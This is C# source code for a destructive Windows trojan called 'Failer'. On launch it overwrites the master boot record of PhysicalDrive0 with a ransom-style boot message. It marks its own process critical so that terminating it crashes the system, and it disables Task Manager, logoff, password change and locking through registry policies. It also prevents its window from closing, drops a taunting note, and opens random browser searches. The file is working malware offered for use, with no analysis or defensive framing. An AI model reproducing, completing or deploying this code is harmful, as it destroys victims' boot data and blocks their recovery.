using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.IO;

namespace Failer
{
    public partial class Payloads : Form
    {

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
        [DllImport("kernel32")]
        private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode,
            IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
        [DllImport("kernel32")]
        private static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberBytesWritten,
            IntPtr lpoverlapped);
        private const uint GenericRead = 0x80000000;
        private const uint GenericWrite = 0x40000000;
        private const uint GenericExecute = 0x20000000;
        private const uint GenericAll = 0x10000000;

        private const uint FileShareRead = 0x1;
        private const uint FileShareWrite = 0x2;
        private const uint OpenExisting = 0x3;
        private const uint FileFlagDeleteOnClose = 0x40000000;
        private const uint MbrSize = 512u;

        public Payloads()
        {
            InitializeComponent();
            this.TransparencyKey = this.BackColor;
            TopMost = true;
            r = new Random();
        }
        Random r;

        private void Payloads_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }
        private void Payloads_Load(object sender, EventArgs e)
        {
            var mbrData = new byte[] {
            0xEB, 0x00, 0x31, 0xC0, 0x8E, 0xD8, 0xFC, 0xB8, 0x12, 0x00, 0xCD, 0x10, 0xBE, 0x24, 0x7C, 0xB3,
0x0F, 0xE8, 0x02, 0x00, 0xEB, 0xFE, 0xB7, 0x00, 0xAC, 0x3C, 0x00, 0x74, 0x06, 0xB4, 0x0E, 0xCD,
0x10, 0xEB, 0xF5, 0xC3, 0x59, 0x6F, 0x75, 0x72, 0x20, 0x63, 0x6F, 0x6D, 0x70, 0x75, 0x74, 0x65,
0x72, 0x20, 0x69, 0x73, 0x20, 0x74, 0x72, 0x61, 0x73, 0x68, 0x65, 0x64, 0x20, 0x62, 0x79, 0x20,
0x66, 0x61, 0x69, 0x6C, 0x65, 0x72, 0x20, 0x74, 0x72, 0x6F, 0x6A, 0x61, 0x6E, 0x0D, 0x0A, 0x69,
0x66, 0x20, 0x79, 0x6F, 0x75, 0x20, 0x73, 0x65, 0x65, 0x20, 0x74, 0x68, 0x61, 0x74, 0x20, 0x73,
0x63, 0x72, 0x65, 0x65, 0x6E, 0x20, 0x66, 0x6F, 0x72, 0x20, 0x79, 0x6F, 0x75, 0x72, 0x20, 0x6D,
0x62, 0x72, 0x20, 0x69, 0x73, 0x20, 0x64, 0x65, 0x73, 0x74, 0x72, 0x6F, 0x79, 0x65, 0x64, 0x21,
0x0D, 0x0A, 0x0D, 0x0A, 0x41, 0x6C, 0x77, 0x61, 0x79, 0x73, 0x20, 0x52, 0x65, 0x6D, 0x65, 0x6D,
0x62, 0x65, 0x72, 0x21, 0x20, 0x46, 0x61, 0x69, 0x6C, 0x65, 0x72, 0x20, 0x69, 0x73, 0x20, 0x52,
0x45, 0x41, 0x4C, 0x0D, 0x0A, 0x0D, 0x0A, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x64, 0x20, 0x62,
0x79, 0x20, 0x4A, 0x61, 0x6D, 0x6D, 0x69, 0x6E, 0x2C, 0x20, 0x4D, 0x6F, 0x64, 0x69, 0x66, 0x69,
0x63, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x73, 0x20, 0x74, 0x6F, 0x20, 0x74, 0x68, 0x65, 0x20, 0x63,
0x6F, 0x64, 0x65, 0x20, 0x61, 0x72, 0x65, 0x20, 0x70, 0x72, 0x6F, 0x68, 0x69, 0x62, 0x69, 0x74,
0x65, 0x64, 0x2E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};
            var mbr = CreateFile("\\\\.\\PhysicalDrive0", GenericAll, FileShareRead | FileShareWrite, IntPtr.Zero,
                OpenExisting, 0, IntPtr.Zero);
            WriteFile(mbr, mbrData, MbrSize, out uint lpNumberofBytesWritten, IntPtr.Zero);
            int isCritical = 1;
            int BreakOnTermination = 0x1D;
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
            RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
            key.SetValue("DisableChangePassword", 1, RegistryValueKind.DWord);
            key.SetValue("DisableLockWorkstation", 1, RegistryValueKind.DWord);
            key.SetValue("DisableLogoff", 1, RegistryValueKind.DWord);
            key.SetValue("HideFastUserSwitching", 1, RegistryValueKind.DWord);
            timer1.Start();
            timer2.Start();
            // Get the path to the local app data folder
            string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

            // Create the file path for note.txt
            string filePath = Path.Combine(localAppData, "note.txt");

            // If exist to delete
            if (File.Exists(filePath))
            {
                File.Delete(filePath);
            }

            // Write some text to the file
            using (StreamWriter writer = File.AppendText(filePath))
            {
                writer.WriteLine("YOUR COMPUTER HAS BEEN TRASHED BY Failer TROJAN");
                writer.WriteLine("");
                writer.WriteLine("your computer won't boot up again.");
                writer.WriteLine("So use it long time if you can!");
                writer.WriteLine(":D");
                writer.WriteLine("");
                writer.WriteLine("if you try to kill Failer will");
                writer.WriteLine("destroy your computer now!");
                writer.WriteLine("");
                writer.WriteLine("Source by Jammin");
            }
            // Open the file with the default text editor
            System.Diagnostics.Process.Start(filePath);
        }


        private void timer1_Tick(object sender, EventArgs e)
        {
            timer1.Stop();
            int true_num = r.Next(10);
            if (true_num == 1)
            {
                System.Diagnostics.Process.Start("https://www.google.com/search?q=how to delete Failer trojan?");
            }
            if (true_num == 2)
            {
                System.Diagnostics.Process.Start("https://www.google.com/search?q=how to overwrite my mbr?");
            }
            if (true_num == 3)
            {
                System.Diagnostics.Process.Start("https://www.google.com/search?q=if delete system to what happen?");
            }
            if (true_num == 4)
            {
                System.Diagnostics.Process.Start("https://www.google.com/search?q=I HATE SCHOOL");
            }
            if (true_num == 5)
            {
                System.Diagnostics.Process.Start("https://www.google.com/search?q=how 2 make trojan?");
            }
            if (true_num == 6)
            {
                System.Diagnostics.Process.Start("https://www.google.com/search?q=HOW 2 DOWNLOAD FAILER.exe TROJAN?");
            }
            if (true_num == 7)
            {
                System.Diagnostics.Process.Start("https://www.google.com/search?q=Thank you soo much! :>");
            }
            if (true_num == 8)
            {
                System.Diagnostics.Process.Start("https://www.google.com/search?q=INFECTED BY Failer TROJAN HELP ME!");
            }
            if (true_num == 9)
            {
                System.Diagnostics.Process.Start("https://www.google.com/search?q=how 2 overwrite LogonUI.exe?");
            }
            if (true_num == 10)
            {
                System.Diagnostics.Process.Start("https://www.google.com/search?q=Failer trojan is bad trojan");
            }
            timer1.Start();
        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            timer2.Stop();
            var NewForm = new Failer_Sound();
            NewForm.ShowDialog();
        }
    }
}
